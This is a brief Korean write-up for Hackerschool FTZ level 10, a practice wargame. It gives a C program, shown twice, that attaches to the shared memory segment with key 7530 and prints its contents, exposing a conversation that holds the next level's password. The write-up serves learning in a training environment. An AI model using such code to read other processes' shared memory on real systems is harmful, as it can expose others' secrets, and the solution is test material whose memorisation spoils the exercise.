Hackerschool FTZ level10
===
hint는 공유메모리를 보라는 뜻인데 

이것을 c코드로 짜면 

~~~c
#include<stdio.h>
#include<sys/shm.h>
#include<sys/ipc.h>
#include<sys/types.h>

int main()
{
        int shmid;
        char* shared_memory;
        shmid = shmget(7530,1024,0666);
        shared_memory = shmat(shmid,NULL,0);
        printf("shared_memory is : %s\n",shared_memory);
        shmdt(shared_memory);
        return 0;
}

~~~

가된다 
>shmget은 공유메모리를 생성
>
>shmat은공유메모리를 프로세스에 첨부
>
>shmdt는공유메모리 분리이다.

이코드를 실행하면 대화내용이 보이며 패스워드가 보인다,
~~~c
#include<stdio.h>
#include<sys/shm.h>
#include<sys/ipc.h>
#include<sys/types.h>

int main()
{
        int shmid;
        char* shared_memory;
        shmid = shmget(7530,1024,0666);
        shared_memory = shmat(shmid,NULL,0);
        printf("shared_memory is : %s\n",shared_memory);
        shmdt(shared_memory);
        return 0;
}
~~~

